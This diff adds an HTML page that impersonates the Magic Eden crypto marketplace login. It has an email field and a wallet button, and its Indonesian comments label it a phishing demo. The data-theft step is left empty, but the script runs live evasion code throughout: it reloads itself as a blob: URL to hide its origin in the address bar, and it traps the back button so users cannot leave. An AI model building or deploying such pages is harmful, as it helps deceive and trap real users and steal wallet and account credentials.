@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Magic Eden Login</title>
+  <style>
+    body {
+      background-color: #0d0d0d;
+      color: #ffffff;
+      font-family: sans-serif;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .container {
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+    .logo-text {
+      font-size: 1.8em;
+      font-weight: bold;
+      margin-bottom: 1em;
+    }
+    /* Teks logo Magic Eden – bisa disesuaikan warna aksen jika perlu */
+    .logo-text {
+      color: #fff; /* teks Magic Eden berwarna putih */
+    }
+    form {
+      margin-bottom: 1em;
+    }
+    input[type="email"] {
+      width: 100%;
+      padding: 0.8em;
+      font-size: 1em;
+      background: #1e1e1e;
+      border: 1px solid #444;
+      border-radius: 4px;
+      color: #fff;
+      box-sizing: border-box;
+      margin-bottom: 0.8em;
+    }
+    input[type="email"]::placeholder {
+      color: #888;
+    }
+    button {
+      cursor: pointer;
+      font-size: 1em;
+      padding: 0.8em;
+      width: 100%;
+      border-radius: 4px;
+      border: none;
+    }
+    /* Tombol Continue bergaya tombol primer (background accent color) */
+    #continueBtn {
+      background-color: #bb86fc; /* warna aksen ungu muda */
+      color: #fff;
+      border: none;
+      margin-bottom: 0.5em;
+    }
+    /* Tombol View all wallets bergaya outline (transparan dengan border aksen) */
+    #walletBtn {
+      background-color: transparent;
+      border: 2px solid #bb86fc;
+      color: #bb86fc;
+    }
+    .divider {
+      color: #aaa;
+      margin: 1em 0;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo-text">Magic Eden</div>
+    <form id="loginForm">
+      <input type="email" placeholder="Email address" required />
+      <button id="continueBtn" type="submit">Continue</button>
+    </form>
+    <div class="divider">OR</div>
+    <button id="walletBtn" type="button">View all wallets</button>
+  </div>
+
+  <script>
+    // Mencegah pengiriman form sebenarnya
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      // Di skenario phishing asli, data email akan dicuri di sini.
+      // Dalam demo ini, tidak ada aksi pengiriman untuk keamanan.
+    });
+
+    // Blob URL Execution – sembunyikan origin di address bar
+    if (!location.href.startsWith('blob:')) {
+      const htmlContent = document.documentElement.outerHTML;
+      const blob = new Blob([htmlContent], { type: 'text/html' });
+      const blobUrl = URL.createObjectURL(blob);
+      location.replace(blobUrl);
+    }
+
+    // Back-button trapping – mencegah pengguna meninggalkan halaman dengan tombol back
+    if (location.href.startsWith('blob:')) {
+      history.pushState(null, '', location.href);
+      window.addEventListener('popstate', function(event) {
+        // setiap kali back ditekan, dorong lagi state ke depan
+        history.pushState(null, '', location.href);
+      });
+    }
+  </script>
+</body>
+</html>
